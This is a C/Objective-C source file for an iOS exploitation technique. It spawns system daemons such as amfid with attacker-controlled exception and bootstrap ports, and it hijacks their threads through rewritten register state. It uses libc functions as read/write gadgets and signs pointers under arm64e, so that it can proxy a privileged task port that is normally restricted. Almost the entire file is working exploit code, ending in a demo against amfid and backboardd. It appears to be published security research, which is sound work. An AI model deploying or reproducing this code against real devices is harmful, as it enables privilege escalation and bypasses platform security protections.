/* Copyright (c) 2020 Siguza
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 *
 * This Source Code Form is "Incompatible With Secondary Licenses", as
 * defined by the Mozilla Public License, v. 2.0.
**/

// NOTE:
// You NEED to compile this as arm64e if operating on arm64e processes!
// Otherwise the address returned by dlsym() will be wrong.

#include <dlfcn.h>
#include <pthread.h>
#include <spawn.h>
#include <stdbool.h>
#include <string.h>
#include <mach/mach.h>
#include <Foundation/Foundation.h>

typedef void *xpc_object_t;
extern xpc_object_t xpc_dictionary_create_reply(xpc_object_t request);
extern void xpc_dictionary_set_int64(xpc_object_t xdict, const char *key, int64_t value);
extern int xpc_pipe_routine_reply(xpc_object_t reply);
extern int xpc_pipe_receive(mach_port_t port, xpc_object_t *msg);

#ifdef __arm64e__
#   define __fp __opaque_fp
#   define __lr __opaque_lr
#   define __sp __opaque_sp
#   define __pc __opaque_pc
#   define ptrtype void*
#   define xpaci(x) __asm__ volatile("xpaci %0" : "+r"(x))
#else
#   define ptrtype uint64_t
#   define xpaci(x) (void)(x)
#endif

// 0 = success
// 1 = exit loop
// rest = error
typedef int (*callback_t)(_STRUCT_ARM_THREAD_STATE64 *state, size_t n, void *arg);

static int handler(mach_port_t port, callback_t cb, void *arg)
{
    task_t self = mach_task_self();
    for(size_t n = 0; true; ++n)
    {
#pragma pack(push, 4)
        typedef struct
        {
            mach_msg_header_t head;
            mach_msg_body_t body;
            mach_msg_port_descriptor_t thread;
            mach_msg_port_descriptor_t task;
            NDR_record_t NDR;
            exception_type_t exception;
            mach_msg_type_number_t codeCnt;
            integer_t code[2];
            int flavor;
            mach_msg_type_number_t stateCnt;
            _STRUCT_ARM_THREAD_STATE64 state;
            mach_msg_trailer_t trailer;
        } Request;
        typedef struct {
            mach_msg_header_t head;
            NDR_record_t NDR;
            kern_return_t RetCode;
            int flavor;
            mach_msg_type_number_t stateCnt;
            _STRUCT_ARM_THREAD_STATE64 state;
        } Reply;
#pragma pack(pop)
        Request req = {};
        kern_return_t ret = mach_msg(&req.head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, (mach_msg_size_t)sizeof(req), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(ret != KERN_SUCCESS)
        {
            NSLog(@"mach_msg_receive: %s\n", mach_error_string(ret));
            return -1;
        }

        mach_port_deallocate(self, req.thread.name);
        mach_port_deallocate(self, req.task.name);

        NSLog(@"Got message: 0x%x 0x%x\n"
               " x0: 0x%016llx  x1: 0x%016llx  x2: 0x%016llx  x3: 0x%016llx\n"
               " x4: 0x%016llx  x5: 0x%016llx  x6: 0x%016llx  x7: 0x%016llx\n"
               " x8: 0x%016llx  x9: 0x%016llx x10: 0x%016llx x11: 0x%016llx\n"
               "x12: 0x%016llx x13: 0x%016llx x14: 0x%016llx x15: 0x%016llx\n"
               "x16: 0x%016llx x17: 0x%016llx x18: 0x%016llx x19: 0x%016llx\n"
               "x20: 0x%016llx x21: 0x%016llx x22: 0x%016llx x23: 0x%016llx\n"
               "x24: 0x%016llx x25: 0x%016llx x26: 0x%016llx x27: 0x%016llx\n"
               "x28: 0x%016llx x29: 0x%016llx x30: 0x%016llx\n"
               " pc: 0x%016llx  sp: 0x%016llx psr: 0x%08x"
#ifdef __arm64e__
               " flags: 0x%08x"
#endif
               "\n"
               , req.code[0], req.code[1]
               , req.state.__x[ 0], req.state.__x[ 1], req.state.__x[ 2], req.state.__x[ 3], req.state.__x[ 4], req.state.__x[ 5], req.state.__x[ 6], req.state.__x[ 7], req.state.__x[ 8], req.state.__x[ 9]
               , req.state.__x[10], req.state.__x[11], req.state.__x[12], req.state.__x[13], req.state.__x[14], req.state.__x[15], req.state.__x[16], req.state.__x[17], req.state.__x[18], req.state.__x[19]
               , req.state.__x[20], req.state.__x[21], req.state.__x[22], req.state.__x[23], req.state.__x[24], req.state.__x[25], req.state.__x[26], req.state.__x[27], req.state.__x[28], (uint64_t)req.state.__fp
               , (uint64_t)req.state.__lr, (uint64_t)req.state.__pc, (uint64_t)req.state.__sp, req.state.__cpsr
#ifdef __arm64e__
               , req.state.__opaque_flags
#endif
           );

        int r = cb(&req.state, n, arg);
        if(r != 0 && r != 1)
        {
            return -1;
        }
        uint64_t pc = (uint64_t)req.state.__pc;
        xpaci(pc);
        uint64_t print_pc = pc;
#ifdef __arm64e__
        // iOS 12.1+ needs signing
        if(@available(iOS 12.1, *))
        {
            req.state.__lr = __builtin_ptrauth_sign_unauthenticated(req.state.__lr, 0 /* ia */, __builtin_ptrauth_string_discriminator("lr"));
            req.state.__opaque_flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR;
            pc = (uint64_t)__builtin_ptrauth_sign_unauthenticated((void*)pc, 0 /* ia */, __builtin_ptrauth_string_discriminator("pc"));
        }
#endif
        req.state.__pc = (ptrtype)pc;
        NSLog(@"Calling 0x%llx", (uint64_t)print_pc);

        Reply rep = {};
        rep.head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req.head.msgh_bits), 0);
        rep.head.msgh_remote_port = req.head.msgh_remote_port;
        rep.head.msgh_size = (mach_msg_size_t)sizeof(rep);
        rep.head.msgh_local_port = MACH_PORT_NULL;
        rep.head.msgh_id = req.head.msgh_id + 100;
        rep.head.msgh_reserved = 0;
        rep.NDR = NDR_record;
        rep.RetCode = KERN_SUCCESS;
        rep.flavor = req.flavor;
        rep.stateCnt = req.stateCnt;
        rep.state = req.state;

        ret = mach_msg(&rep.head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(rep), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(ret != KERN_SUCCESS)
        {
            NSLog(@"mach_msg_send: %s\n", mach_error_string(ret));
            return -1;
        }
        if(r != 0)
        {
            break;
        }
    }
    return 0;
}

typedef struct
{
    // Our task
    mach_port_t exc_port;
    mach_port_t serviceport;
    volatile mach_port_t realport;
    // Other task
    uint64_t mem;
    uint32_t self_port;
    uint32_t proxy_port;
} proxy_arg_t;

static int proxy_setup_cb(_STRUCT_ARM_THREAD_STATE64 *state, size_t n, void *a)
{
    static uint32_t other_port = 0;
    static uint64_t portarr = 0;
    proxy_arg_t *arg = a;

    // Always set lr to an invalid address so that we fault and get back here
    state->__lr = (ptrtype)0x41414141;
    switch(n)
    {
        case 0:
            // Get other port (usually 0x103, but ehh)
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "task_self_trap");
            return 0;
        case 1:
            other_port = (uint32_t)state->__x[0];
            NSLog(@"[proxy_setup] other_port: 0x%x", other_port);
            // Allocate some scratch space
            state->__x[0] = 0x10040;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "malloc");
            return 0;
        case 2:
            arg->mem = state->__x[0];
            NSLog(@"[proxy_setup] mem: 0x%llx", arg->mem);
            if(!arg->mem)
            {
                return -1;
            }
            // Fetch the port we stashed onto scratch mem
            state->__x[0] = other_port;
            state->__x[1] = arg->mem;
            state->__x[2] = arg->mem + 8;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "mach_ports_lookup");
            return 0;
        case 3:
            NSLog(@"[proxy_setup] mach_ports_lookup: %s", mach_error_string(state->__x[0]));
            if(state->__x[0] != KERN_SUCCESS)
            {
                return -1;
            }
            // Use a gadget func to read from mem
            //     ldr x0, [x0, 8]
            //     ret
            state->__x[0] = arg->mem - 0x8;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "platform_thread_get_unique_id");
            return 0;
        case 4:
            portarr = state->__x[0];
            // Now we have the array ptr, so read from that
            state->__x[0] = portarr - 0x8;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "platform_thread_get_unique_id");
            return 0;
        case 5:
            // Both ports in one go
            arg->self_port = (uint32_t)state->__x[0];
            arg->proxy_port = (uint32_t)(state->__x[0] >> 32);
            NSLog(@"[proxy_setup] ports: 0x%x 0x%x", arg->self_port, arg->proxy_port);
            // And free the mem
            state->__x[0] = other_port;
            state->__x[1] = portarr;
            state->__x[2] = 3 * sizeof(mach_port_t); // just the way it is
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "mach_vm_deallocate");
            return 0;
        case 6:
            NSLog(@"[proxy_setup] mach_vm_deallocate: %s", mach_error_string(state->__x[0]));
            if(state->__x[0] != KERN_SUCCESS)
            {
                return -1;
            }
            state->__x[0] = arg->self_port;
            state->__x[1] = arg->serviceport;
            state->__x[2] = MACH_MSG_TYPE_MOVE_RECEIVE;
            state->__x[3] = arg->mem;
            state->__x[4] = arg->mem + sizeof(mach_port_t);
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "mach_port_extract_right");
            return 1; // exit caller loop
    }
    return 1;
}

static int proxy_run_cb(_STRUCT_ARM_THREAD_STATE64 *state, size_t n, void *a)
{
    proxy_arg_t *arg = a;
    uint32_t tmp;

    state->__lr = (ptrtype)0x69696969;
    if(n == 0)
    {
        NSLog(@"[proxy_setup] mach_port_extract_right: %s", mach_error_string(state->__x[0]));
        if(state->__x[0] != KERN_SUCCESS)
        {
            return -1;
        }
        // Receive message
        state->__x[0] = arg->mem + 0x40;
        state->__x[1] = MACH_RCV_MSG;
        state->__x[2] = 0; // send size
        state->__x[3] = 0x10000;  // recv size
        state->__x[4] = arg->proxy_port;
        state->__x[5] = MACH_MSG_TIMEOUT_NONE;
        state->__x[6] = MACH_PORT_NULL;
        state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "mach_msg");
        return 0;
    }
    switch((n-1) % 9)
    {
        case 0:
            NSLog(@"[proxy_run] mach_msg: %s", mach_error_string(state->__x[0]));
            if(state->__x[0] != KERN_SUCCESS)
            {
                return -1;
            }
            // Get reply port
            // Load value (ldr x0, [x0, 8])
            state->__x[0] = arg->mem + 0x40 + __builtin_offsetof(mach_msg_header_t, msgh_remote_port) - 0x8;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "platform_thread_get_unique_id");
            return 0;
        case 1:
            NSLog(@"[proxy_run] remote_port: 0x%x", (uint32_t)state->__x[0]);
            // Stash that into local port
            // Store value (str w1, [x0, 0x1c])
            state->__x[1] = (uint32_t)state->__x[0];
            state->__x[0] = arg->mem + 0x40 + __builtin_offsetof(mach_msg_header_t, msgh_local_port) - 0x1c;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "xpc_service_instance_set_binpref"); // for 64bit: xpc_service_instance_set_finalizer_f (str x1, [x0, 0x88])
            return 0;
        case 2:
            // Get msg bits (ldr x0, [x0, 8])
            state->__x[0] = arg->mem + 0x40 + __builtin_offsetof(mach_msg_header_t, msgh_bits) - 0x8;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "platform_thread_get_unique_id");
            return 0;
        case 3:
            tmp = (uint32_t)state->__x[0];
            NSLog(@"[proxy_run] msgh_bits: 0x%x", tmp);
            tmp = (tmp & 0xffff0000) | ((tmp & 0xff) << 8) | ((tmp & 0xff00) >> 8);
            // Update msgh_bits (str w1, [x0, 0x1c])
            state->__x[1] = tmp;
            state->__x[0] = arg->mem + 0x40 + __builtin_offsetof(mach_msg_header_t, msgh_bits) - 0x1c;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "xpc_service_instance_set_binpref");
            return 0;
        case 4:
            // Get real target port
            // Only at this point can we assume that other threads have updated arg->realport.
            state->__x[0] = arg->self_port;
            state->__x[1] = arg->realport;
            state->__x[2] = MACH_MSG_TYPE_COPY_SEND;
            state->__x[3] = arg->mem;
            state->__x[4] = arg->mem + sizeof(mach_port_t);
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "mach_port_extract_right");
            return 0;
        case 5:
            NSLog(@"[proxy_run] mach_port_extract_right: %s", mach_error_string(state->__x[0]));
            if(state->__x[0] != KERN_SUCCESS)
            {
                return -1;
            }
            // Load value (ldr x0, [x0, 8])
            state->__x[0] = arg->mem - 0x8;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "platform_thread_get_unique_id");
            return 0;
        case 6:
            NSLog(@"[proxy_run] realport: 0x%x", (uint32_t)state->__x[0]);
            // Store value (str w1, [x0, 0x1c])
            state->__x[1] = (uint32_t)state->__x[0];
            state->__x[0] = arg->mem + 0x40 + __builtin_offsetof(mach_msg_header_t, msgh_remote_port) - 0x1c;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "xpc_service_instance_set_binpref");
            return 0;
        case 7:
            // Load msg size (ldr x0, [x0, 8])
            state->__x[0] = arg->mem + 0x40 + __builtin_offsetof(mach_msg_header_t, msgh_size) - 0x8;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "platform_thread_get_unique_id");
            return 0;
        case 8:
            // Send msg, then receive the next
            state->__x[2] = (mach_msg_size_t)state->__x[0]; // send size
            state->__x[0] = arg->mem + 0x40;
            state->__x[1] = MACH_SEND_MSG | MACH_RCV_MSG;
            state->__x[3] = 0x10000;  // recv size
            state->__x[4] = arg->proxy_port;
            state->__x[5] = MACH_MSG_TIMEOUT_NONE;
            state->__x[6] = MACH_PORT_NULL;
            state->__pc = (ptrtype)dlsym(RTLD_DEFAULT, "mach_msg");
            return 0;
    }
    // Should never get here, but eh
    return 1;
}

static void* proxy_server(void *a)
{
    proxy_arg_t *arg = a;

    if(handler(arg->exc_port, &proxy_setup_cb, arg) == 0)
    {
        handler(arg->exc_port, &proxy_run_cb, arg);
    }

    return NULL;
}

static const char* err(int e)
{
    return e == 0 ? "success" : strerror(e);
}

mach_port_t haxx(const char *path_of_executable, volatile mach_port_t **realport)
{
    int r = 0;
    kern_return_t ret = 0;
    pid_t pid = -1;
    posix_spawnattr_t att;
    mach_port_t exc_port = MACH_PORT_NULL;
    mach_port_t strap_port = MACH_PORT_NULL;
    mach_port_t proxy_port = MACH_PORT_NULL;
    xpc_object_t request = NULL;
    xpc_object_t reply = NULL;
    proxy_arg_t *arg = NULL;
    pthread_t th;
    task_t self = mach_task_self();

    ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &exc_port);
    NSLog(@"mach_port_allocate: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return MACH_PORT_NULL;

    ret = mach_port_insert_right(self, exc_port, exc_port, MACH_MSG_TYPE_MAKE_SEND);
    NSLog(@"mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return MACH_PORT_NULL;

    ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &strap_port);
    NSLog(@"mach_port_allocate: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return MACH_PORT_NULL;

    ret = mach_port_insert_right(self, strap_port, strap_port, MACH_MSG_TYPE_MAKE_SEND);
    NSLog(@"mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return MACH_PORT_NULL;

    ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &proxy_port);
    NSLog(@"mach_port_allocate: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return MACH_PORT_NULL;

    ret = mach_port_insert_right(self, proxy_port, proxy_port, MACH_MSG_TYPE_MAKE_SEND);
    NSLog(@"mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return MACH_PORT_NULL;

    mach_port_t ports[] = { self, proxy_port };
    ret = mach_ports_register(self, ports, 2);
    NSLog(@"mach_ports_register: %s", mach_error_string(r));
    if(r != KERN_SUCCESS) return MACH_PORT_NULL;

    r = posix_spawnattr_init(&att);
    NSLog(@"posix_spawnattr_init: %s", err(r));
    if(r != 0) return MACH_PORT_NULL;

    r = posix_spawnattr_setspecialport_np(&att, strap_port, TASK_BOOTSTRAP_PORT);
    NSLog(@"posix_spawnattr_setspecialport_np: %s", err(r));
    if(r != 0) return MACH_PORT_NULL;

    r = posix_spawnattr_setexceptionports_np(&att, EXC_MASK_ALL, exc_port, EXCEPTION_STATE_IDENTITY, ARM_THREAD_STATE64);
    NSLog(@"posix_spawnattr_setexceptionports_np: %s", err(r));
    if(r != 0) return MACH_PORT_NULL;

    r = posix_spawn(&pid, path_of_executable, NULL, &att, (char* const*)(const char*[]){ path_of_executable, NULL }, (char* const*)(const char*[]){ NULL });
    NSLog(@"posix_spawn: %s", err(r));
    if(r != 0) return MACH_PORT_NULL;

    r = posix_spawnattr_destroy(&att);
    NSLog(@"posix_spawnattr_destroy: %s", err(r));
    if(r != 0) return MACH_PORT_NULL;

    r = xpc_pipe_receive(strap_port, &request);
    NSLog(@"xpc_pipe_receive: %d", r);
    if(r != 0) return MACH_PORT_NULL;

    reply = xpc_dictionary_create_reply(request);
    xpc_dictionary_set_int64(reply, "error", 0x9c);
    r = xpc_pipe_routine_reply(reply);
    NSLog(@"xpc_pipe_routine_reply: %d", r);
    if(r != 0) return MACH_PORT_NULL;

    arg = malloc(sizeof(proxy_arg_t));
    NSLog(@"proxy arg: %p", arg);
    if(!arg) return MACH_PORT_NULL;

    arg->exc_port = exc_port;
    arg->serviceport = proxy_port;
    arg->realport = MACH_PORT_NULL;
    arg->mem = 0;
    arg->self_port = 0;
    arg->proxy_port = 0;

    r = pthread_create(&th, NULL, &proxy_server, arg);
    NSLog(@"pthread_create: %s", err(r));
    if(r != 0) return MACH_PORT_NULL;

    pthread_detach(th);

    *realport = &arg->realport;

    return proxy_port;
}

void demo(void)
{
    // This is just setup
    volatile mach_port_t *realport;
    mach_port_t proxy = haxx("/usr/libexec/amfid", &realport);
    kern_return_t ret;
    task_t task;
    pid_t pid;
    posix_spawnattr_t att;
    posix_spawnattr_init(&att);
    posix_spawnattr_setflags(&att, POSIX_SPAWN_START_SUSPENDED);
    posix_spawn(&pid, "/usr/libexec/backboardd", NULL, &att, (char* const*)(const char*[]){ "/usr/libexec/backboardd", NULL }, (char* const*)(const char*[]){ NULL });
    posix_spawnattr_destroy(&att);
    task_for_pid(mach_task_self(), pid, &task);
    NSLog(@"task: 0x%x", task);

    // This is the task port we normally couldn't use.
#if 0
    // And now instead of this:
    ret = mach_ports_register(task, NULL, 0);
#else
    // We can do this:
    *realport = task;
    ret = mach_ports_register(proxy, NULL, 0);
#endif
    NSLog(@"mach_ports_register: %s", mach_error_string(ret));
}
